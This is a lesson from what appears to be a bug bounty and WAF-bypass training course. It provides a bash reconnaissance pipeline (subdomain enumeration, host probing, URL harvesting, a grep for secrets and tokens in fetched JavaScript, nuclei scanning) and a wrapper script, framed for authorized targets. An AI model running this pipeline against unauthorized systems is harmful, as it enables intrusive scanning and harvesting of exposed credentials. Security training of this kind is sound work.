# 🚀 Session 6: Build Your Full Recon Pipeline

## Tool 9: `recon_pipeline.sh`

Save as:

```text
~/waf-lab/scripts/recon_pipeline.sh
```

```bash
#!/bin/bash

# Full reconnaissance pipeline for authorized bug bounty targets.

set -euo pipefail

if [ -z "${1:-}" ]; then
  echo "Usage: $0 <domain>"
  exit 1
fi

TARGET="$1"
DATE="$(date +%Y%m%d)"
WORKDIR="$HOME/bb-workspace/${TARGET}-${DATE}"

mkdir -p "$WORKDIR"
cd "$WORKDIR"

echo "================================================"
echo "Target: $TARGET"
echo "Workspace: $WORKDIR"
echo "================================================"

echo
echo "[Phase 1] Subdomain enumeration"

subfinder -d "$TARGET" -all -silent -o subs-subfinder.txt || true
assetfinder --subs-only "$TARGET" > subs-assetfinder.txt || true

curl -s "https://crt.sh/?q=%25.$TARGET&output=json" \
  | jq -r '.[].name_value' \
  | sort -u > subs-crtsh.txt || true

cat subs-*.txt 2>/dev/null | sort -u > subs-all.txt
echo "[+] Total unique subdomains: $(wc -l < subs-all.txt)"

echo
echo "[Phase 2] Live host detection"

cat subs-all.txt \
  | httpx -silent -status-code -title -tech-detect -web-server -ip \
  -o live-hosts.txt || true

echo "[+] Live hosts: $(wc -l < live-hosts.txt 2>/dev/null || echo 0)"

echo
echo "[Phase 3] URL collection"

cat subs-all.txt | waybackurls | sort -u > urls-wayback.txt || true
cat subs-all.txt | gau --threads 10 > urls-gau.txt 2>/dev/null || true

cat urls-*.txt 2>/dev/null | sort -u > urls-all.txt
echo "[+] Total URLs: $(wc -l < urls-all.txt 2>/dev/null || echo 0)"

echo
echo "[Phase 4] Interesting URL filtering"

grep -E "\.(js|json|xml|config|env|bak|sql)$" urls-all.txt > urls-interesting.txt || true
grep -iE "(api|admin|debug|test|dev|stage)" urls-all.txt >> urls-interesting.txt || true
sort -u urls-interesting.txt -o urls-interesting.txt || true

echo
echo "[Phase 5] Parameter discovery"

grep "=" urls-all.txt \
  | grep -oE "\?.+" \
  | grep -oE "[a-zA-Z_][a-zA-Z0-9_]*=" \
  | tr -d "=" \
  | sort -u > params-found.txt || true

echo "[+] Parameters: $(wc -l < params-found.txt 2>/dev/null || echo 0)"

echo
echo "[Phase 6] JavaScript analysis"

grep "\.js$" urls-all.txt | head -100 > js-urls.txt || true
mkdir -p js-files

while read -r js_url; do
  filename="$(echo "$js_url" | sed 's#https\?://##; s#[/:?&=]#_#g')"
  curl -s "$js_url" -o "js-files/$filename" || true
done < js-urls.txt

grep -hrE "(api[_-]?key|secret|token|password|Bearer)" js-files/ \
  > js-secrets.txt 2>/dev/null || true

echo "[+] Potential secret-like strings: $(wc -l < js-secrets.txt 2>/dev/null || echo 0)"

echo
echo "[Phase 7] Nuclei scan"

awk '{print $1}' live-hosts.txt > targets.txt 2>/dev/null || true

nuclei -l targets.txt \
  -severity medium,high,critical \
  -o nuclei-results.txt \
  -silent || true

echo "[+] Nuclei findings: $(wc -l < nuclei-results.txt 2>/dev/null || echo 0)"

echo
echo "================================================"
echo "RECON COMPLETE"
echo "================================================"
echo "Subdomains:       $(wc -l < subs-all.txt 2>/dev/null || echo 0)"
echo "Live hosts:       $(wc -l < live-hosts.txt 2>/dev/null || echo 0)"
echo "URLs:             $(wc -l < urls-all.txt 2>/dev/null || echo 0)"
echo "Interesting URLs: $(wc -l < urls-interesting.txt 2>/dev/null || echo 0)"
echo "Parameters:       $(wc -l < params-found.txt 2>/dev/null || echo 0)"
echo "Nuclei findings:  $(wc -l < nuclei-results.txt 2>/dev/null || echo 0)"
echo "Workspace:        $WORKDIR"
echo "================================================"
```

### Install Dependencies

```bash
go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install github.com/tomnomnom/assetfinder@latest
go install github.com/tomnomnom/waybackurls@latest
go install github.com/lc/gau/v2/cmd/gau@latest
go install github.com/ffuf/ffuf/v2@latest
```

### Make Executable

```bash
chmod +x ~/waf-lab/scripts/recon_pipeline.sh
```

### Usage

```bash
~/waf-lab/scripts/recon_pipeline.sh target.com
```

---

# 🔗 Session 7: Integration & Final Toolkit

## Complete Toolkit Structure

```text
~/waf-lab/
├── scripts/
│   ├── polyglot_builder.py
│   ├── sqli_polyglot.py
│   ├── param_fuzz.py
│   ├── js_endpoint_extract.py
│   ├── multi_scan.py
│   ├── bypass_matrix.py
│   ├── target_checker.py
│   ├── wordlist_gen.py
│   ├── recon_pipeline.sh
│   ├── encoder.py
│   ├── waf_detector.py
│   ├── crs_fingerprint.py
│   ├── ssrf_ip_bypass.py
│   ├── cl_te_detect.py
│   ├── cloud_waf_recon.py
│   ├── find_origin.sh
│   └── bigip_decode.py
│
├── burp-extensions/
│   ├── xss_detector.py
│   └── auto_bypass.py
│
├── nuclei-templates/
│   ├── custom-reflected-xss.yaml
│   └── common-debug-exposure.yaml
│
├── payload-vault/
└── wordlists/
```

---

## Master Command: `hunt.sh`

Save as:

```text
~/waf-lab/hunt.sh
```

```bash
#!/bin/bash

# BB Hunter Toolkit — Master Command
# Use only on authorized targets.

set -euo pipefail

if [ -z "${1:-}" ]; then
  echo "BB Hunter Toolkit"
  echo "Usage: hunt <target-domain>"
  echo
  echo "Example: hunt example.com"
  exit 1
fi

TARGET="$1"
DATE="$(date +%Y%m%d)"
WORKDIR="$HOME/bb-workspace/${TARGET}-${DATE}"

echo "┌────────────────────────────────────────┐"
echo "│ BB HUNTER TOOLKIT v1.0                 │"
echo "│ Target: $TARGET"
echo "│ Time: $(date)"
echo "└────────────────────────────────────────┘"

mkdir -p "$WORKDIR"

echo
echo "[1/5] Quick target evaluation"
python3 ~/waf-lab/scripts/target_checker.py "https://$TARGET" || true

echo
echo "[2/5] Cloud WAF detection"
python3 ~/waf-lab/scripts/cloud_waf_recon.py "https://$TARGET" || true

echo
echo "[3/5] Origin discovery"
bash ~/waf-lab/scripts/find_origin.sh "$TARGET" || true

echo
echo "[4/5] Full recon pipeline"
bash ~/waf-lab/scripts/recon_pipeline.sh "$TARGET" || true

echo
echo "[5/5] JavaScript analysis"
python3 ~/waf-lab/scripts/js_endpoint_extract.py \
  -u "https://$TARGET" \
  -o "$WORKDIR/js-findings.json" || true

echo
echo "✅ Hunt complete!"
echo "Workspace: $WORKDIR"
```

### Install

```bash
chmod +x ~/waf-lab/hunt.sh

ln -s ~/waf-lab/hunt.sh ~/.local/bin/hunt 2>/dev/null || \
  sudo ln -s ~/waf-lab/hunt.sh /usr/local/bin/hunt
```

### Usage

```bash
hunt example.com
```

---

## GitHub Publishing Checklist

- [ ] Professional `README.md`
- [ ] `LICENSE`
- [ ] `.gitignore`
- [ ] Installation instructions
- [ ] Usage examples
- [ ] Troubleshooting section
- [ ] Screenshots or GIFs
- [ ] No secrets
- [ ] No private target data
- [ ] Clear ethical-use disclaimer
- [ ] Tagged release: `v1.0.0`

---

# 🔁 Micro-Habits Continuation

## Today’s Additions

### 🌅 Morning — Tool of the Day

Pick one tool from your arsenal and run it once.

```text
Tool:
Target:
Result:
Improvement idea:
```

### ☀️ Afternoon — Payload Mutation

Take one lab payload and generate variations.

```bash
python3 polyglot_builder.py --mode variations --output today-variations.txt
```

### 🌙 Evening — Tool Improvement

Spend 10 minutes improving one tool.

Examples:

- Add a help message
- Add error handling
- Improve output formatting
- Add logging
- Add README usage examples

---

## Weekly Habit

Every Saturday, publish one thing:

- GitHub update
- Short X / LinkedIn post
- Blog note
- Tool release
- New template

---

# 🏆 Day 12 Challenge

Mark Day 12 complete after:

- [ ] All Python tools built and tested
- [ ] Polyglot generator produces variants
- [ ] SQLi reference tool created
- [ ] Parameter fuzzer tested in a lab
- [ ] JavaScript endpoint extractor tested
- [ ] Multi-scan tool tested
- [ ] Bypass matrix tested against local WAF lab
- [ ] Wordlist generator created
- [ ] One Burp extension loaded
- [ ] One custom Nuclei template created
- [ ] Recon pipeline run on an authorized target
- [ ] Master `hunt.sh` command installed
- [ ] GitHub repo structured professionally
- [ ] README written with installation and usage
- [ ] Safe public notes pushed to GitHub

---

# 📋 Master Cheat Sheets

## Cheat Sheet 1: Tool Quick Reference

```text
CUSTOM TOOLS

polyglot_builder.py      → Generate lab-safe XSS polyglots
sqli_polyglot.py         → SQLi detection payload reference
param_fuzz.py            → Smart parameter fuzzing
js_endpoint_extract.py   → Extract endpoints from JavaScript
multi_scan.py            → Parallel target scanning
bypass_matrix.py         → Test payloads across WAF lab levels
wordlist_gen.py          → Target-specific wordlists
recon_pipeline.sh        → Full recon automation
hunt.sh                  → Master workflow command
```

---

## Cheat Sheet 2: When to Use Which Tool

| Scenario | Tool |
|---|---|
| New target, first pass | `hunt.sh` |
| Cloud WAF detection | `cloud_waf_recon.py` |
| Parameter fuzzing | `param_fuzz.py` |
| JavaScript endpoint extraction | `js_endpoint_extract.py` |
| Target-specific wordlists | `wordlist_gen.py` |
| Local WAF lab comparison | `bypass_matrix.py` |
| Custom CVE/misconfig checks | `nuclei` |
| Content discovery | `ffuf` |

---

## Cheat Sheet 3: Nuclei Template Essentials

```yaml
id: unique-template-id

info:
  name: Descriptive Name
  author: yourname
  severity: info
  tags: custom

requests:
  - method: GET
    path:
      - "{{BaseURL}}/path"

    matchers:
      - type: status
        status:
          - 200
```

---

## Cheat Sheet 4: Python Tool Template

```python
#!/usr/bin/env python3
"""Tool description."""

import argparse


def main_logic(target: str) -> None:
    """Main tool logic."""
    print(f"Target: {target}")


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True)
    args = parser.parse_args()

    main_logic(args.url)


if __name__ == "__main__":
    main()
```

---

# 📚 Resources

## Tool Inspiration

- [ProjectDiscovery](https://github.com/projectdiscovery)
- [defparam/smuggler](https://github.com/defparam/smuggler)
- [albinowax tools](https://github.com/albinowax)
- [tomnomnom/waybackurls](https://github.com/tomnomnom/waybackurls)

---

## Burp Extension Development

- [Burp Montoya API Docs](https://portswigger.net/burp/documentation/desktop/extensions/creating/using-montoya-api)
- [Burp Extension Examples](https://github.com/PortSwigger/example-scanner-checks)
- [Jython](https://www.jython.org/download)

---

## Nuclei

- [Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates)
- [Template Writing Guide](https://docs.projectdiscovery.io/templates/introduction)

---

## Wordlists

- [SecLists](https://github.com/danielmiessler/SecLists)
- [Assetnote Wordlists](https://wordlists.assetnote.io)
- [OneListForAll](https://github.com/six2dez/OneListForAll)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

# ❓ Self-Check Questions

1. Why do elite hunters build custom tools?
2. What is a polyglot payload?
3. How does `js_endpoint_extract.py` help find hidden endpoints?
4. What is the difference between Jython and the Montoya API?
5. Why are target-specific wordlists useful?
6. What does `matchers-condition` do in Nuclei?
7. What does `recon_pipeline.sh` automate?
8. Why is `hunt.sh` useful?
9. What makes a GitHub toolkit publishable?
10. How would I add a new feature to `param_fuzz.py`?
11. Why should tools include logging and clear output?
12. Why should every custom tool have a README?

✅ All 12 answered confidently? **Day 12 complete!**

---

# 🚀 What’s Next?

## Day 13 Preview — Live Bug Bounty Recon → Exploitation Workflow

- Select your first real bug bounty target
- Apply the custom toolkit end-to-end
- Document your hunting session
- Practice scope handling
- Start a real-world workflow responsibly

---

# 📝 My Day 12 Notes

## Tools Built Today

- [ ] `polyglot_builder.py`
- [ ] `sqli_polyglot.py`
- [ ] `param_fuzz.py`
- [ ] `js_endpoint_extract.py`
- [ ] `multi_scan.py`
- [ ] `bypass_matrix.py`
- [ ] `target_checker.py`
- [ ] `wordlist_gen.py`
- [ ] `recon_pipeline.sh`
- [ ] `hunt.sh`

---

## Burp Extensions

- [ ] `xss_detector.py`
- [ ] `auto_bypass.py`

---

## Nuclei Templates

- [ ] `custom-reflected-xss.yaml`
- [ ] `common-debug-exposure.yaml`

---

## Tools Tested

| Tool | Test Target | Result |
|---|---|---|
| `polyglot_builder.py` | Local lab |  |
| `bypass_matrix.py` | PL1–PL4 lab |  |
| `recon_pipeline.sh` | Authorized target |  |
| `js_endpoint_extract.py` | Authorized target |  |

---

## GitHub Published

- [ ] Repo created
- [ ] README written
- [ ] LICENSE added
- [ ] `.gitignore` added
- [ ] First release tagged
- [ ] Shared publicly if safe

---

## Micro-Habits Today

- [ ] Morning writeup
- [ ] Tool of the day used
- [ ] X feed scan
- [ ] Payload mutation
- [ ] HTTP header inspection
- [ ] Parameter miner
- [ ] PortSwigger lab
- [ ] Terminal journal
- [ ] Tool improvement

---

## Toolkit Stats

```text
Total Python scripts:
Total Bash scripts:
Total Burp extensions:
Total Nuclei templates:
Total lines of code:
```

---

## Key Insight Today

```text
Great hunters consume tools. Elite hunters create them.
```

---

<p align="center">
  <strong>🎓 Day 12 Status:</strong> ⬜ In Progress / ✅ Complete<br>
  <em>“Your tools are extensions of your mind. Sharpen them daily.”</em>
</p>

<p align="center">
  <a href="./Day-11.md">← Previous: Day 11</a> |
  <a href="./Day-13.md">Next: Day 13 →</a>
</p>

---

# 🚀 Commit Workflow

```bash
cd ~/WAF-Bypass-30-Days/

# Save Day 12
nano Week-03/Day-12.md

# Create directories
mkdir -p ~/waf-lab/scripts
mkdir -p ~/waf-lab/burp-extensions
mkdir -p ~/waf-lab/nuclei-templates

# Save tools
nano ~/waf-lab/scripts/polyglot_builder.py
nano ~/waf-lab/scripts/sqli_polyglot.py
nano ~/waf-lab/scripts/param_fuzz.py
nano ~/waf-lab/scripts/js_endpoint_extract.py
nano ~/waf-lab/scripts/multi_scan.py
nano ~/waf-lab/scripts/bypass_matrix.py
nano ~/waf-lab/scripts/target_checker.py
nano ~/waf-lab/scripts/wordlist_gen.py
nano ~/waf-lab/scripts/recon_pipeline.sh
nano ~/waf-lab/hunt.sh

# Save Burp extensions
nano ~/waf-lab/burp-extensions/xss_detector.py
nano ~/waf-lab/burp-extensions/auto_bypass.py

# Save Nuclei templates
nano ~/waf-lab/nuclei-templates/custom-reflected-xss.yaml
nano ~/waf-lab/nuclei-templates/common-debug-exposure.yaml

# Make scripts executable
chmod +x ~/waf-lab/scripts/*.py
chmod +x ~/waf-lab/scripts/*.sh
chmod +x ~/waf-lab/hunt.sh

# Install Python dependencies
pip install requests beautifulsoup4 urllib3

# Copy safe public files to repo
cp -r ~/waf-lab/scripts ~/WAF-Bypass-30-Days/scripts/
cp -r ~/waf-lab/burp-extensions ~/WAF-Bypass-30-Days/burp-extensions/
cp -r ~/waf-lab/nuclei-templates ~/WAF-Bypass-30-Days/nuclei-templates/

# Commit
git add Week-03/Day-12.md scripts/ burp-extensions/ nuclei-templates/
git commit -m "🛠️ Day 12: Custom toolkit, automation, and polyglot builder"
git push origin main
```

---

# 🎯 Key Actions for Today

- [ ] Build tools one at a time
- [ ] Test each tool in a lab before using elsewhere
- [ ] Run `bypass_matrix.py` against the local PL1–PL4 lab
- [ ] Run `recon_pipeline.sh` only on an authorized target
- [ ] Load one Burp extension
- [ ] Create one Nuclei template
- [ ] Publish safe tooling notes to GitHub
- [ ] Keep private target data out of the repo

---

# 💡 Pro Tips

- Do not chase perfection. Make tools work first.
- Test in your lab before touching real programs.
- Document while coding.
- One working tool is better than ten unfinished tools.
- Read other tools’ source code to learn patterns.
- Never commit private findings, secrets, tokens, or target data.

